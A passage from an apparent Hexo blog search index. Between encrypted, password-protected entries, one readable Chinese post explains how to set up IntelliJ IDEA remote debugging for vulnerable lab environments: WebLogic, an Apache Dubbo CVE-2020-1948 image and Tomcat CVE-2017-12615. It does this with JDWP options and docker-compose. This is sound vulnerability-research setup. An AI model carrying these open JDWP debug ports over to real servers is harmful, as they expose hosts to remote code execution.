f9da5514399f816cad3aece9731e22695530129f5fa5fc97bc43b1889dbcf7a8cceb2db238ca92120c26799f71db5695d8f42011b5c0f3f3053322564bf896e64e317f8a37ee14b39fbfd868682e5747dee0d2a2bc8b0ec69aa2fd3663b8efd0b3a640929ffb56bb24d9e4910ddd1862549bf84fbb805cb21a6be04371b82bf009af54a528ca13d03d6cfdec40c53ada33060d036ca7f7242cd042bcae8d7fd649db3d746ee1a5e05c81045d4f411a26ed0e9b9e4bacccbe81658b277e4fd3e96b145204063b06566ad942024e23a675b152c2bcfa2a406096aba7c2ff0860ed6dde6208d944c720b28adf1e4a3c39837e75e8e66e6e303eed03d778da70813e0104b9785e8fce83a0bc0790ccf2ea8f7e6aec620d305b98e6c80e4865532486d2075c5ce66af2f5f51a3302dba08a8304ff3c8700fc4ed21ff0a50fabefa69543e4f1af2d225906f70ded1112845bc2279b1153f5deb46e2270ce27ad85222cdc38cf77f1297ab5eca42992868b666b80c3ed86665dd7e0c1ffcc72ffd169be10115b984a55c91e77cd8811dc2d73b077cf3d35d071310c1d970074fc300cd9269037aed275846418a67674baa72c85817bc17421bc1e43dae2fbf23fdef7f4a65c5368f429f439061634b0738dfd5509dec329193c7ccd6b238d72d8eeb77f4fb1cecc5d85f78e7c4d9915917b1b4f87f76e287f7d00e50238164d196cf5d46a714ffd9bfcb829d1dfbe9cf0ecbc3e5b185ad9d6cd873ee6eabd017aff37ac378f61188a8903c9afa80d464201a52a29e1d81c840a1b4f3fa7dad5e99c652c79e3e1ff10a43298e119bc50ba76262043f6f705bb6248bba5c5e59cd5525bb273bfb405b9a2f56ca3e6195d541fd42493623ec3c2c38e45a965e784587c0c299bf2e235487c08c9e74d2994503c87cdf70ab35ad4156cbe55e5272e7b030e2477bb47fe9644c45fa1cc98bb1259e3808977f669f0d789f2c42c319214eee52daae64e3a6ce001d22820efa820a1ef46dac8028527a1161eb71beb711b7fd101227916240ac43753b2cacb77bb4c0d75a62afc24dc4c2aaf334d483c78e42d6200b76f8190e231716f58e849f5062d1ea4bd52b621eecb7667e11f72e8f5f8b933c2f1d072d913bab7ed846bc6155334fbcb47e828d3ca2aabf1fa46cc186eaff33c5ba8df440dfa71683096c69b57d6df08255ee8e4ec0c2d824c77a3efcb4aa1c79f502ccc348817b52ecef8d52625fee1944c1be38235bbdb0ec84272dd9b072720dab73c1233f39e761ea32003031d9800b694cf9bf02d4391d8aa589c757bc955d8e2f99627f948e610ebd81bde0cc1bb92a54a09ac3e79c76fb04c190c491af0b58a19c03a456081482c8b59081555d72bd77611ad955fd24ad7b888c0650102c6c040e1463186f2e005a191e0cfc6a504c6e0ce870132ef7361d21774bba322d3342367ec4ad62bd9159d25c4da008dc2c7421ced9814eaca30542bcf237d25ef811e8da880d654e65146b42260995634cc6ecdb5ee1dabcbca9686d083b70f44a0d35e9fbf2862b2bdf21b402ffff9f35051e5190b6db8c0e82843aafd69ce5ebce2cb68edd7d507f1fea4c92824d99bb0ec348394520e878a50928840b4406709c03b33fc6d765146cec97283401e383560f72531afc7fdc218136daabc5b1ab4a7337d07b0b131fb22b91a2a836dd468cd3699a75304454efd5c1eef5102040303b57041eee6bcd9ca713f8f9e2078f1c0923012a7a32b0e2a117588c67c8bb9af319bfa2e0f114c80eb3404799d15bfb7a96d5574b0d064f7804d81b3497d15c9701f0a3126766e29679e08817b5ab44f32288a24660648804755db0388dc8e07b8cb55d6c108d85ee2ed6153d1fcdf1a328e3b8774c4e42517a2a073ebad0d510e7c97bbc13d8690611e3cba096cdc2d0ea09b0c33767369fe4eb60da40532d0317979a59493b0f43c973e72bbfc04710c4d5ec2ad84c0e9fb0938c7c61a085072353e23632207fd34d0f82cf305a903e5418c94bfc9d4d6c75d6e461ae61e80462abab59d674b7ac9a555c2ea97c280bd69b958667169c39c47821016e62f13f5284937cc1d4672b71c0f0e9eb5181207f57dad34f1683d9c83a14c17060a7329e76efdcc50f96ea85b980d7baf5c955ef7d8af5dbd946c2a524b09f647079d95b9f39b73f38656cdebde0b816760f417da3e3e6bc2ef9615bed10af19990e43bf7145b1f89af6ec49cc02f2b9d49f6ab059f3e9ec9cade94ba72a272d785072a3c2f7d9b5f849f1c65644ca7797b997dbe9bcb58eb4423308730f0fa3d7c8f6ba41f8078628dd2885e1e8e14bc1aa48b288d42c57f7d888452c8b7f4fa80543054b5c02da565ec71280539d3c1da7a4bfaaa039851b04b5c94bba0c0111bc5bc360725c388d1843a6b2422858d92ce9209efa95eec0d2a7fb9003f1cbdc4f66227a4d0a622b3f508b98da1198498fe5bf4311ed887c333113cd297a9a52bd23633ac8de31adc818d855c6d85dd6415d1a9b878fe6fb970a614127e8410bc93a92ca2bc1bf48134843e7d4e5cd7250a5658516228585d902d425ef0589918a609df6906cee9bc4aaab8ba7099f78c0710d8856286942b9039e2a50927866091bd763ffe0a698e58e019d21ed230bc2211b4998ab3744e28eefd35d8ff0308afc09eb41cc1bac82659e4efc2e542141749ceed5a2404d8b62f9d8a27aa0bb90fee0776e8782c1a564982bb55513c098dfb0f71def69259cf8ffa33d0c04c824015d222313a5c26110209332a16a5e222c908f166a125e9cbafaf14f67195a5f4e51f41ada18660227f58aeea42f1d6ff8726873cab296fb6d684039200795833261db4a2dd6888ac8053c32bfbeb741f70a08e04c68f1ee6fa8a639f360ebc14a7a4b556683836ceaf960f5be8ccae8c9ccb11acd74e03b7de12aa3fa6b81d2a05265abeb7e120cd39dd8c916805435d5f38333e1ed5664ae44b56a4a9e93add7ec8370a09a97d62bff4a890171acf66c7c56cdc5598229b4981549268dc21257854ab3fff417411d5655774744678cf8f64944429b5c3886f520d4e8f99933c3043711c5a8c9d143a759fe228e8e1bdc1882e98934316dfc10fd2d5758bc4b4cc8eba38bc3486d8f694ffe00d08158a652468853516a83150d19690082a72465e76740af4bd5988ec0b959c793ce8e35eb7c96ca067fcb8df0146873e10dfdfbfb6203bad413547c9d4e80e87aa86016b237948fb0b62daf801780c4538c27c5f28fd13324dde88fd4606efee07d6225b31553e9b7f08adb7ebe4518acfd699f9e92d9c3036723dba126dc08b0e2cf48b140a389a62686377791f5cbf0eac0eb65a86607c9818d11fd0b589bb29ff7eac078be8ec7fbbb2fa74c90b3247d0853f1721ffe8e12d77fa5b0a5c86a45bf6eadb46f0f7f69bac2ee10e906a066bd686675109b15788c5333d8997bd04c4dcf2fd5adb58e8b664d0b168adb09ad4e562202d91bff204605beb06f76dccd3a9709808e4a9c35a48e2aed418d0d04fb9927ea0f7189477227821ce11ff6b8985b0cd8a452a465763a0dc89516bb9dd4d99c5d69efb3c97fce22c5369f67ff37d60c17d15f6af16d62eefde3bf7adc8f787061d16aeea1756fcc2bdcc278d010e86e73205856ee432cafc625f3c23245a7506302858af9e40ea3fcf51d5727e609b197bd9d2887a3f8ababe7c8b6bf1a7a24bc6f98a481f8ac925bbd33ec6764866286af4b46b8666e5dcb39a2d3feec674ab2a6852be6033cc0e7be94698c3b23b918d67e9924b9b4f31b7dce9530065c197b00a8c8876c227b1ff68131586df24a89ff746e8d7cc604096daa70133c55ddba0c5c8103e49dc2d592fbfefee30193d016ec255aa11052275d6b965b215460a24dca93af985d80b7eb177f5ca8677e239ebb4d426a50580e9607a01ae5a4b7c708116110a2009de10581d71effaead25ebbe210e5b4a809f2745a787bd9429bf2295182eae69ba9d692a79c3a65edcd3d536b3736d3de4f626cd0a1539a2be7e8cef3f327848bc326cbc8c3a7e6de6d8c9a445e308e4c2a9f36b908e373667224505f9af982a6e67d21043b69e9dc2c38dc14697d572160fe2bfb271e5571f7103bb4e947dbd405b028cff805af548fe72bfbfc3b6a3b2d5d2d26dbe73fc42cb05452e918b105f69ae11ea6ea30034f6bea79fad71dc06f72726e22e74fbb3a95c7458593477b4ebfb78108e083e7d8ce659dd36a9f0d32adcdb57cdd3b41c32b937bb0adbe6cb37c6d0458007f0236e3b9039e414afa93269259f54a535e842ab1bcb36d89afa54ad0ab8abb0b247ff93f0675d67c614f3f32ee328b68166feef634d89a48d6eef4010aadc89e384d85ee4a4d4731c9fa0b098406de82c992147d7d2cf90bf7c8e8799a25dad6bbe87170c256e62c4075d93047d60385aa2d967ef77db5cc42a1ceb4ab20a8ddbabb8c071d2e4afa9a8a4276b3f946370b7d37f37cdfbdbd1c7c88964719a9b29983da554b668bf0db0359c15c8a83f50c68eb7d5fa84c03773ab848d0d8be6777262231294027a635a715cf6c6baa317b988e666d8ee2f7ba7b3bd6907ef69fca81828938391dc0f458a7e54dc2182f28d67e27102172b90e7ab99fd83889e6e27561088769989c3e73714a6d4ffbef36b86d86a38da1666b0c92cf59181e7d4e2beaf084cc29f9e56c1f07a183001bf837389afb586e33991fe88638df7c8c1b312506d2c07160c9b05a9c35975e071781d810b06aac02956f419cc7b23d3070b39eeb94115fad4b6ec11daa740b4ae7c038f87e927af988f31bfef05bbc58c8b354eb42a4322a8727e267b68d69a11992f377b466b0ed0aa5ac6e46d6a5e3b61ec49fb7fa182e06474d9eae719ae00bfc6dd8bd1e664077524525033be0c33d6112abccd202907b0da84ec560f776a2b7af0184c4b87a48da0f8d305b0c71786f8adc6d223f644092e922acdc989aa561acdcf0a151d128176dd39d80c87af0850a699ead94f82e037e063330b0c3e73102d28cbe496c7b1295a544224e7467ca823bdc04ddc600c5342e1190516711460aa740cc6f3438fd7dc8dea613ff5dd9fb4cfb79f961f00abfc2227a951c8c7d285aad621b2e5704daadbc8cf08b7ddd2552ec9c1840837058b6e72f39ae78b3ef3517c1fe7c86b98f0fcef349b03c4d8b05641926a023f0878f6de1069a9363a1fbbb91677d73ed3ca89d0b86b51fd82075794116f089bf84984ff2dfed12e60b2bf2ca53d332a43aa370b0cbd90251425a4aa673af8a9d5cc1e6a168f7eb453c3dbb01c18017fd9684722b17ef77e927e49a2b0552932de2e64ce91f06fde373d621221b27ac38b6cac157779e3da1697aaa58969babec2ba7bdf6020a1165e3316c3822ac191bdedb802113c404fd0126f62550f65c939d99984b8669ec3e77cc25c74eb4e0b8c17545009049e411653a12eb280f0e5fcc8088a81d14fcd6b97985e97df5481adb6506f53dec12876e032dbf521de2771c85b9e167644c5ead1530a0ead482090a79cb382b4d6ae7a82f8f57ef968e8a94f8074b29223ce5c0d3283df3b7ee7a76cc0a272bd97d5ebe3d14f1b6ca329587b9f1b801fcf50171dfe7fab65f2d27649104cb1bf3af3bdc50aedbd7ed8ac53d4cc970569bed8298a1a6b112b050cc01f4bf27f516b8180c7d971079b1d079b1fa03ec5f56fb0f7a60e4d4ad572bb5829ff1a7985d3c19886e61aa9ee1bba049d8720893608bb88ce25a4d5603a3b20f985d803bdeda90b69bfd3733f995cf0746c1585d22b446f27f4764554d6109987d5fbeeac9863ac94da3a4081f1400fd69b06903bbaba2dc3ecbbe7f5da53b5e287a7a3ebbf3dbc92a8eee912483518f9e74110cd4e38775d9a90b909c7174fd5e63ae156a33d26e30401a5a7083e7e2c6a46e84b021ef169397dc1776ac735557373c1361973c66d35a8dabc5b48e82ec33e4d1f4b68a0ff5fbd93bb06132d8838e5f6892040dd9009b0af516f837e7a3b1176267f5ea7039f6f1e7e74b7d252f464920556b208276aa94b6c7d51f3766d7d14498af36939d8164a9c8324e6b1132d15331cd2ce32238217ae94e2bc55c4f680952d18037f9ab79a8f0923cc8de08ddf8474ca32d3990b81cb1604f00eda145824bc658870b2e52a9870febdbf283c7c135841f8669f904d925288ba0e6a16acc4c2468d3c77977cbeb40f82cb403c70fe57cadc1fd288e7e61a3676600b36a54c31b2f85b62eb2e7e00b749bd0d4736cc55973a39267008ae470ee9a5c28cffe7288d2c8c86c6d8675641b01c8ec56da4e33ebf5ef29365b53a07cd64e686faff46fda327d9f05f1bffe909915ad16011e6f70677c510da70238377cba9e24fc387ef4c5cc6ee88befd19e7b5e59ad7f4ff10ef9d144e0ae95523943d33e85568f5e5c43a833a20159bca37ee35f3318bb7c72f2a4377d5299e621d3fa8c9b8c6cee97863b46ce2ec8c89b3476e5a089aa9a3a63afa9d28960e17cbfdc242b29f3982547046a9fd3f8f53db7f7a3a2178c8af47c6967f405f87947321f9adb755289f68eaf9af2c0dd3a8c42d0700c73239debefd4bad1913472e6cfe8ecaa06e74a8e37aad1291ceda36cf08449f5eee28c01d5b544c553452ac85acd77ffef3f354220031b3f82343880a0bf68fffb5f92617380f810ef8649c1876f546d4ca80ed38aeda65d18bcce30633a848bc2cf5ae35532ce848d2cea8ab6e97ad595a8a5315b28ef3908050b573e40ece02b285d582ba5c3b50ad11c659c17e5f5f1c64a9b04bdcb95444aa0c20454a1a21826fd20e9bf4b5fa91b3b4c5a1562f80ec3fab1ad4294ac9048893c8c98e6a48518ddc7270dadd0a09a9169f5a4481e5e60a03f60cfc97b5a911700c66e4f892dfc878207eb3ce81401ddb3f41d173afe0a243256ed351892c705f94a2182aa5971907cb4f1faeb1c1bf381e77a3dc9966aa78858087dbaaf6715ee09c36d9ea8b821d5686a70774a1fc6263918bf54f6830d53d9e13ae2ff2416cd8b3529de69dc75ba49cb967cac7bd6a1979187c5dfd05aed9b28d03e0334e2ca8cf193cdf5d0ceff16f73a0327db760e0001eab2dc25bba5e98fd506a06fedb3c3fdc06f7af3247574815bc13376595f98c918815acefa4c60f7adcfa7e743b06486086626f7b68dd504534b69874c323514635f761fd8e1de04ef6a0f23500ab0af70d78c97342b242939c4b19c9cb36813a654688944ad10c3a74543ffa95fd9a4f3de76b8d60bb427d89d8efbcd8965ec4d5017b706f311235b95bbea9a868a6bb08414a0d3e5c89b6f7062df7cf5010903c6ce7ed646f9e2c025f80dc8da99a851bc154d69bfa41f299d2e9fd8efefd2f25c56fe29782a9bb59d0c8079c37022d4f1bc32b1e218534fae2d255214940e57f70a119e4b87d6dac68d8c68819a62151592d4b76af5edd3f4b09b81f570280ffd556d72f6af36602cde6324ca4819806851cc9d835fea77ce93cd7d737411d08b07314c57098d69e5b62ef9f324a0493aa898908614acc8f05a2979ecc359aa8206fd030e9fbf1b6b6605f3eeb8c309d54254908a15ecbaa53bf4aed0007beff9051b37987db0544c27ab4d3a0bdf9fe21f1da30bb5aa96099ad55b8d5986eb903224ea09672952394bbe33a3b2d584d3fbf3f29a4c1417087b9415e6c863fc1d4e5184d2170d6333c2acdfca9ad9f577418e9b50ed95cc3a5be6e33f9c1dbdfa1b2cf689d7807e67e33b7e4deaed18ce0e8d6338e8a94f1ec5c78d26b213a2ca721143727ad0f73097fa7051f45d3a35be316235bf1a79466f7436a54572fed21f6d60c4d63a47675046b360ce0dd60f5b380f42ee2cc9dfb1d5ebeee02b88403e30f949ccd61a5a0d728135fe95218f0fb8c053e28bf5f25cfadb23961901bc86e8de2731df33225da6af74ad78b7f4dad81aff8c4bc619702ee2e5a350744504922fe95c9f88c7a2e110ea292a4b53fcdee5610237af17404b1f6aef8f63e223c058e0ab5c28ffe43a4cc172c8ff9eaf86ed8891eb1a24c815eb8f505b4e7186ad9be39003e5b7f490ffd06e6a9fe24fe5432cc69105fa05f597778707cf5354faacacce4a5545b194ee40918b85491d4ff79ce86c159096f618607dfceb0c3a7c02b469dce1839ebe0ca099135c12c20046af55dae37294c5329d5915cdf6a9255a104ef46aae3626aef121a6d500fce1784ad1b49291341cc169346c10b7480df4b56a5f23e86a8b8c24dba770a564171123f32da7faf5e53719b9a0b1632706b7717937371d56571719a3cd6377df35ae256568c6717ffbe050dae53e3b5383b349460957c2180b5733d7ede13ff8df42a2ec5f11b61eb4183d88bd037ed2009c15c6e026472bdf1d31211409fa9b87318299155bfaacdc70e8fcaf736e30a45f850277355d3d651ef6d9a3a0cb8d4331387ab5fa87033d1433ecd58ebce1b829604229a0508ffbd9c338449df586d0368323cf10073dd58d527e6551e4b835ee2560c1b1db54c01fb68199195d3ebb7c79dd0cda3c0986d33ea1167b0a59bce281de4b9fcfd8c1f4509f474d3fc245bca5e14f9d6c51ded2da974d1647bb3830dcd3045ce3c3db5b1136edf5de372fc9c61de54096f8aae77a199aac7b761d0c4d202f9d79270a73656cb040d674dd41dda7b3b92264c07e0dff90afc16283b41e504a76cc28210a005c85bca5ae9cd5543128f00fcd4e00b09d6b0646ff032d2fced608fd32da20a3cc9c85e608de83d505027ef6657155b8f97aec10680207dc5ef75ddc09186e3d3facda03e992878e78b8cf2f9301c4e8bde6177a9fb64798228748cab55cc25bae1e67a84e358c35555c26615884da4abcbe4da6b33d41721cc28f423d4a4c0aeb6007908ab498370e71940f59f05e375cbea7baac5526a0883ec70a21a21ee51b6a9094d6adfacc8eaa6d28f0a510f584311ce664f4d9585a830755e0f27debf40909f92b6c363c6ff353409d3ed093ff5d9f75adaf5d59763217169fb122a22b6b4ca8e1e6748311e86323edc3aeea9601cfb885ae5845c8bd4053126e63b5da13ab50f4e153e4e1de912017fbb2d5871d1e8a2952b8d89bb7cd17cd8f21da87abda0f83cda13672b7d5e083d69be3ca2f82a9cb2eb955fe91f40dcd0b9cab4c601a7b0aa92a83348995c9d8b84c91eb065484ce6e5fa9503f9380d1ad4c1e7ca3efdedb76119411a2380d5015e80af66a42f054e5fa7253b7cd5fa3848fd8886dafcc04a6a161bbf749466176474335bd66633973f1c10eea147300e3acf3e2333be01994d6b9cd6a5e4a4ebd68355cf1c5370419a2c361c64410205b377d41eb5b245322002bb92b023b8657e24166baf7f1c55f0aab92f3b52ca002aff619ade28f9f3f472f18c62759769b2f9feb05e8a2c4f4aed7f15cf139478009cda8b8e1c84479bba6c71981f3c5e03e71041307785154c6ef29d51c88a31abe9b169b5d87913a48f29cab8587eb10e3bdbef9706455e8f7701bb0780fb00ab58590f5e8ffec52e91a0172c70c2d29cda92196b554f83b193981354910bdc8e1773cb599b309990e809eae88d629b58c770b0cdba1af71c7eea1c0448a9e07abbabb299bf27413317b1e64e74a98c3147ec940b46c119cfec3edb0c0d7a4df8ae24e84357c465b100b53e51e71dec0fb5f426364eb2e80c7c693d1cd5de4b67e9e41067ff4f3b90b2c73f1c0280e8feed0317b37dfd1aca38791bde4fbc279513a50a6f91c8d864612c5adb25df868c41cc64ae27609e6942086fae11534aa189e5cc0e4050e7af75ae28850e4eb247acb918e32c0f787906989ef88d070124df68ad390899f1627691f5bdce1d1f714c73e15d6bc0f6c6ce9a69e2d4ccab7835bca468cbe78a06b89f2bbe727316ae3765d7d69546cbe01325d544b399250bcbbee55d515caf42d1a0fa585e58b44363e0c7f321ff3f1ee51969ec2a7e72db7f7f98b73971e79ad46bb89e7cdbcba70226086514629b617e27f2a1c13a8811167d7a693f2b2252d770e7d583663d0e7b96bd6126d1e47ded624379865acf1c023170041447e6425e772ca1ae8cb71c9cdc085437f05874d281abf52388fccf419cb68c26c5ade2aa7bc5d37a45e3569c219d5da4b1058e8228afd7e8489a07b673bfae18aff901b5f1d3bf3dc7c74b14dca8797df2a78b709b0dabdca542d60e9e4fa0a3d82aed77b336d2116550559f078bc9ade4e27db27d749ba1bbda5f42c9db3b430fa01b5c93d4cc94343662ceeccd06a16d198411d966c05bf1648d23b39c51b50b2854fb8755328f72204279fb05f4330a88fac52dfcde2c80ac4054ee737b4e106e9e922f8e7a5fb22f6551ca86ccb94c1c66ac98863d231bf53dfcc9c73b67ba93f8fd921898c4451faf230d011e5b6f69bf9c2c8093105b5de888ead4cf0c00c53e6dfae88a7a3ce8dfff5bee334717366046f7acaa3037f690bb1299fff113cb0eda2eb53dc713ff364962e8af37640ba7d63e5cd359aa7c08ec02d50dca72b1b0d503d2d059f8d79f897df3a32a3910a5311a0abe598f3df6705981006c75ea3a1055dc2239aa8db9708a6f166bb953dc85159f80e5070b7fa4c0f07c20cbede10e14ffab4b5ab32572887e8b1e634291abcb95a664bee5837bb11c97a1ab8af5549406dbe190865e6fe4413df9c1c0f322575f8ebeae6b04e6ebae14e7a089e55550dcc83a31be2557759111cbed8468289615d8187674ba3756dcf240afbec2feecfa8c3803d5447c0dc186d12883d3f8b2605882ccb0eec07bcc8c9d73c9c198022fda6b19e8f2b12fb1ca7e5f496b3a7fc3ca627292df1cc5fcf4a9f48c2f79e71f0868c7b94d5a475be5b2578a1302c758cc93eee09532c8b6da4511363b2526cc051bd52080186f84ba44399c1d173cea1f05acb1aad3056b7c2d75f29d46d21099efdfe43fb3a49daf9465e1ea93428d16666b0212ac0f681b614c18a2c8d91ac90fd9bfb19dc07c26fe9ff4d0b203844ccafc92dd7f1be4a85d53d54e0b5734e90ec710d7e7231a8d8410ab80e0365cbc56124a0fd0e3b931bf033723475d0b07de50aa01de0443a71679c4d815473329236f6a2c3416a6dd1b50ab76c7521208847e11d111e692207227cb6ad3ff47ccac0fb9fea6454cfb1681e6b816294c1a37fbb199f27405943bbf84af17385e9763b03886f41b8adad3dfaab2a4cc5fa5e6fde926ffd8c37b3ccf1dcb6b3a26e97c3d2434f3e73ccec377cae24e41ebf1a670bd105b42dd6e12e1ea87d5560d472691db2d268ac16b0f16e48020d4a475266c9d886a8a121cfac37ba511fc1ff309af15e783ac392e699752124b83980451aa9371b7c5b0a4a72eb7b315ece13858141c784a7acbb4c27b3efcee8264400b13a73eb1523d6edb0416309c726a2a1e22172b027516c52cf22e2dc7cef00fae500c6705e59b2969477c621992c5c381994911611fa80ad20c69fa0244e59cdca8ff564ab6ff1630fc3f5da8f698e454f283fbe9bceb5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA远程调试</title>
      <link href="/p/159c8b21.html"/>
      <url>/p/159c8b21.html</url>
      
        <content type="html"><![CDATA[<h1 id="调试Jar包"><a href="#调试Jar包" class="headerlink" title="调试Jar包"></a>调试Jar包</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar TestRemote.jar</span><br></pre></td></tr></table></figure><p>出现提示：<code>Listening for transport dt_socket at address: 5005</code>即为成功</p><p>编辑IDEA</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220125103227679.png" alt="image-20220125103227679"></p><h1 id="远程调试weblogic"><a href="#远程调试weblogic" class="headerlink" title="远程调试weblogic"></a>远程调试weblogic</h1><p><a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">参考链接</a></p><p>设置远程调试端口</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220124175547504.png" alt="image-20220124175547504"></p><p>运行容器<code>docker-compose up -d</code> 后进入容器修改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code></p><p>把weblogic的源码，所以我们把 weblogic的源码和jdk包都拷贝出来，<strong>注意windows下直接打包所有文件解压会有报错问题</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf all.tar.gz modules/ wlserver_10.3/</span><br></pre></td></tr></table></figure><blockquote><p>将<code>modules</code>和<code>wlserver_10.3</code>文件夹打包复制到宿主机</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 2a51247be16f:/root/Oracle/Middleware/all.tar.gz  /home/user/</span><br></pre></td></tr></table></figure><p>复制两个文件夹到项目中，将<code>modules</code>和<code>wlserver_10.3/server/lib</code>文件夹右键选择添加到库（<code>Add as Library</code>）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220125143551076.png" alt="image-20220125143551076"></p><p><code>wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class</code>的<code>handle</code>方法下断点。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220125141359108.png" alt="image-20220125141359108"></p><p>访问url:<code>http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType</code></p><p>出现如下截图表示成功：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220125141931016.png" alt="image-20220125141931016"></p><h1 id="Apache-Dubbo漏洞远程调试"><a href="#Apache-Dubbo漏洞远程调试" class="headerlink" title="Apache Dubbo漏洞远程调试"></a>Apache Dubbo漏洞远程调试</h1><p>拉镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/dubbo-cve_2020_1948</span><br></pre></td></tr></table></figure><p>看信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect xxx</span><br></pre></td></tr></table></figure><blockquote><p>环境变量和启动命令”java -jar /demo/demo.jar”</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220125144528289.png" alt="image-20220125144528289"></p><p>将容器环境变量和启动命令做修改</p><p> 使用<code>docker-compose</code>来启动服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line">  api:</span><br><span class="line">    build: .</span><br><span class="line">    image: vulfocus/dubbo-cve_2020_1948</span><br><span class="line">    environment:</span><br><span class="line">      - JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=18888</span><br><span class="line">    container_name: dubbo_test</span><br><span class="line">    command:</span><br><span class="line">      - java</span><br><span class="line">      - -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=18888</span><br><span class="line">      - -jar</span><br><span class="line">      - /demo/demo.jar</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;12345:12345&quot;</span><br><span class="line">      - &quot;18888:18888&quot;</span><br></pre></td></tr></table></figure><p>将<code>demo.jar</code>拷贝出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 9d463e930a76:/demo/demo.jar .</span><br></pre></td></tr></table></figure><p>创建一个新项目，在项目下创建一个lib目录，然后打开demo.jar里面的lib下的所有jar拷贝到新建的lib下，并将新建的lib添加到libraries。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220125152452988.png" alt="image-20220125152452988"></p><p>即可远程调试</p><h1 id="远程调试Tomcat"><a href="#远程调试Tomcat" class="headerlink" title="远程调试Tomcat"></a>远程调试Tomcat</h1><p>使用<code>CVE-2017-12615</code>环境</p><p>修改 docker-compose.yml</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220126164138006.png" alt="image-20220126164138006"></p><p>启动容器，在<code>bin/catalina.sh</code>中添加环境变量，然后重启容器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;export CATALINA_OPTS=\&quot;-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,suspend=n,server=y\&quot;&quot; &gt;&gt; bin/catalina.sh</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220127102501871.png" alt="image-20220127102501871"></p><p>在<code>\lib\catalina.jar!\org\apache\catalina\connector\Request.class</code>Request()方法上打断点，访问url<code>http://xx.xx.xx.xx:8080</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220127100832556.png" alt="image-20220127100832556"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Instrument</title>
      <link href="/p/73e26a0d.html"/>
      <url>/p/73e26a0d.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d1b1b3fa1e18c4c3c2e2d6223ff65ed21e5807ca46b37f1b029476e3c542803a">c157c9744e0298d00173c08a9dbffe0e6e8472fd49d234548f468c8b0db21f0c1bfab5e9967bc97868378e39e285647ee48d5086422d129a3b40f85271c07fc186554cc4736755edc9105aceddaa9d66779b681c4abea4d2652b56fa9cdaac96151f8fc9856eb56fec77835af3fe7bd7de210b2ac6e1e3ab9423513600c35c49b4a752f21271f2cf3af9137690817056a6c58837f009f9ac0e685915deff2806e3c328d98d41b9835517b9932ae26ac833de4b3e5a08002db412afe257eb867b9371df00a93fefe8b3e54ff0260725ed8dc9b22b8c6061133ddb56643be86293884c3c1a71b89170805cfa19b7451ea68110f9c341bb2e59e39a5b789d8b1d18950f0125884bd93e3a59ea322983b9412b9240e23aef490a0ca2c249eebd6ccbbbfc982588fee8402a9ee05b0004b5824844e8104a5bcae962fc571fe3ce50a31ced038defed6d5e1af8045a2963eae93c9f9f135f96bf4f743f9d7238fb4527c9715d9bb7f58298c9d9093bb855d5f4c760e71fb81ceef3400c549dde410622bb9650174a9dde9d15f2d7e0b6efe0294476916dab204f51b2ea19510518aaf7bb4d03ab9eaa4e